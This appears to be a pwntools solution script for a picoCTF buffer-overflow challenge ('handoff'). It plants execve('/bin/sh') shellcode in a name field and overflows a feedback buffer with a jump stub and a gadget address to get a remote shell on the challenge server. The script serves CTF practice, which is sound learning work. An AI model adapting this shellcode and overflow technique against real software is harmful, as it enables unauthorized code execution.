from pwn import *

LINK = "shape-facility.picoctf.net"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else None
DEBUG = bool(int(sys.argv[2])) if len(sys.argv) > 2 else True

e = context.binary = ELF("./handoff")

if DEBUG:
    p = process("./handoff")
else:
    p = remote(LINK, PORT)

"""
https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html
BITS 64

xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
"""

# First, add a recipient with our main shellcode
main_shellcode = b"\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xf7\xee\xb0\x3b\x0f\x05"
p.sendlineafter(b"app", b"1")
p.sendlineafter(b"name: ", main_shellcode)

"""
subq $724, %rax
push %rax
ret
"""

jump_shellcode = b"\x90\x90\x48\x2d\xd4\x02\x00\x00\x50\xc3\x90\x90\x90"  # Jump back by 724 bytes

# Pad to reach the return address (20 bytes padding)
# Then use the jmp rax gadget (0x40116c) to the feedback buffer and then finally jmp to shellcode using a relative offset
padding = b"\x00" * (20 - len(jump_shellcode))
payload = jump_shellcode + padding + p64(0x40116c)

# Trigger the buffer overflow
p.sendlineafter(b"app", b"3")

if DEBUG:
    pause()  # Pause to attach debugger if needed

p.sendlineafter(b": ", payload)

# Get shell
p.interactive()

